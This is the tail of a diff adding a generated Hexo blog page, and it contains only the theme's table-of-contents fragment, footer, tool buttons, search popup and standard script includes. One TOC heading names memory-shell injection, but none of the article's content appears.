nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">注入内存马</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ko1sh1</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共 4 篇文章
+                    </span>
+                    
+                        <span>
+                            共 37k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
